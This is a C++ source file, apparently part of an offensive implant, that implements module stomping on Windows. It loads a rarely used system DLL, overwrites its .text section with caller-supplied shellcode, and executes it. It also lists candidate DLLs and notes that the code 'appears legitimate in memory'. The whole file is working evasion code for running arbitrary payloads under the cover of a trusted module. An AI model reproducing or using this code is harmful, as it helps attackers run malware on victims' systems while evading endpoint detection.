#include "ModuleStomp.h"
#include <psapi.h>
#pragma comment(lib, "psapi.lib")

PVOID ModuleStomp::Stomp(const char* dllName, const BYTE* code, SIZE_T codeSize) {
    // Load the DLL without resolving imports — we only need it as a memory canvas.
    HMODULE hMod = LoadLibraryExA(dllName, NULL,
                                  DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (!hMod) return NULL;

    BYTE* base = (BYTE*)hMod;
    auto* dos  = (PIMAGE_DOS_HEADER)base;
    auto* nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto* sec  = IMAGE_FIRST_SECTION(nt);

    BYTE* textBase = NULL;
    DWORD textSize = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textBase = base + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }
    if (!textBase || codeSize > textSize) {
        FreeLibrary(hMod);
        return NULL;
    }

    // Flip to RWX, write shellcode, flip back to RX
    DWORD old;
    if (!VirtualProtect(textBase, codeSize, PAGE_EXECUTE_READWRITE, &old)) {
        FreeLibrary(hMod);
        return NULL;
    }
    memcpy(textBase, code, codeSize);
    VirtualProtect(textBase, codeSize, PAGE_EXECUTE_READ, &old);
    FlushInstructionCache(GetCurrentProcess(), textBase, codeSize);

    return textBase;
}

std::string ModuleStomp::Execute(PVOID stompedAddr) {
    if (!stompedAddr) return "ModuleStomp: NULL address";
    try {
        ((void(*)())stompedAddr)();
    } catch (...) {
        return "ModuleStomp: exception during execution";
    }
    return "ModuleStomp: execution returned normally";
}

void ModuleStomp::Unstamp(HMODULE hMod) {
    if (hMod) FreeLibrary(hMod);
}

std::string ModuleStomp::ListCandidates() {
    // System DLLs that are rarely pre-loaded — good stomp targets.
    // "Good" means small .text, loaded by the kernel when needed, not
    // likely to be already mapped into this process.
    static const char* candidates[] = {
        "version.dll", "wldap32.dll", "msimg32.dll",
        "mpr.dll", "winmm.dll", "imm32.dll",
        "avrt.dll", "dhcpcsvc.dll", "fwpuclnt.dll",
    };
    std::string r = "ModuleStomp candidate DLLs (not pre-loaded in this process):\n";
    for (auto dll : candidates) {
        HMODULE already = GetModuleHandleA(dll);
        r += "  " + std::string(dll) + (already ? "  [already loaded]" : "  [available]") + "\n";
    }
    r += "\nUsage: stomp <dll> <shellcode_hex>\n"
         "The code will execute attributed to the named DLL — appears legitimate in memory.";
    return r;
}
